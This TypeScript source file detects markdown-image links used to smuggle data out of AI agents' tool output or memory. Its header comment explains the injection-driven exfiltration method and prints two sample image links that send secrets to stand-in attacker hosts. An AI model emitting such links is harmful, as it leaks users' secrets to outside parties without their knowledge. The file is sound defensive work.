/**
 * Markdown-Image Exfiltration Detector
 *
 * A classic tool-output / agent-memory exfiltration vector is a markdown image
 * whose URL silently smuggles data to an attacker the moment a client renders
 * it (no click required):
 *
 *   ![x](https://evil.example/log?d=<secrets>)
 *   ![](http://attacker.test/${data})
 *
 * This detector flags markdown image syntax `![alt](URL)` where the URL is an
 * http(s) link that LOOKS like a data-exfiltration sink. It is deliberately
 * conservative — a plain `![logo](https://example.com/logo.png)` must NOT trip
 * it — so a URL only flags when one of these holds:
 *
 *   1. it carries a query string whose value(s) look like smuggled data:
 *      long (>= EXFIL_VALUE_MIN_LEN chars) and/or base64-ish/percent-encoded; OR
 *   2. it contains an unresolved template placeholder (`${...}` / `{{...}}`),
 *      which only appears when an injection is trying to interpolate captured
 *      data into the URL.
 *
 * Pure presence of a query string is NOT enough (analytics/CDN links routinely
 * have `?v=2&w=400`); the value has to look like a payload. This keeps the false
 * positive rate low while catching the real exfil shape.
 */

export interface MarkdownImageExfilResult {
  detected: boolean;
  /** The offending image URLs (capped), for reporting. */
  urls: string[];
}

// Markdown image: ![alt](URL). URL captured up to the closing paren / whitespace.
// Length-capped on alt + URL to keep the regex ReDoS-safe.
const MARKDOWN_IMAGE_PATTERN = /!\[[^\]]{0,200}\]\((https?:\/\/[^)\s]{1,2000})\)/gi;

// A query value that looks like smuggled data: long opaque token, base64-ish,
// or percent-encoded run.
const EXFIL_VALUE_MIN_LEN = 24;
const BASEISH_VALUE = /^[A-Za-z0-9+/_=-]{16,}$/;
const PERCENT_RUN = /(?:%[0-9A-Fa-f]{2}){3,}/;

// Unresolved template interpolation in a URL — never legitimate in a static link.
const TEMPLATE_PLACEHOLDER = /\$\{[^}]*\}|\{\{[^}]*\}\}/;

/**
 * True if an image URL's query string carries values that look like exfiltrated
 * data, or if the URL contains an unresolved template placeholder.
 */
function urlLooksLikeExfil(rawUrl: string): boolean {
  if (TEMPLATE_PLACEHOLDER.test(rawUrl)) return true;

  const qIndex = rawUrl.indexOf('?');
  if (qIndex === -1) return false;

  const query = rawUrl.slice(qIndex + 1);
  if (!query) return false;

  // Inspect each key=value pair; flag if any value looks like a payload.
  for (const pair of query.split('&')) {
    const eq = pair.indexOf('=');
    const value = eq === -1 ? pair : pair.slice(eq + 1);
    if (!value) continue;

    if (value.length >= EXFIL_VALUE_MIN_LEN) return true;
    if (BASEISH_VALUE.test(value) && value.length >= 16) return true;
    if (PERCENT_RUN.test(value)) return true;
  }

  return false;
}

/**
 * Scan content for markdown-image exfiltration links.
 */
export function detectMarkdownImageExfil(content: string): MarkdownImageExfilResult {
  const urls: string[] = [];

  MARKDOWN_IMAGE_PATTERN.lastIndex = 0;
  let match: RegExpExecArray | null;
  while ((match = MARKDOWN_IMAGE_PATTERN.exec(content)) !== null) {
    const url = match[1];
    if (urlLooksLikeExfil(url)) {
      urls.push(url.slice(0, 200));
      if (urls.length >= 10) break;
    }
  }

  return {
    detected: urls.length > 0,
    urls,
  };
}
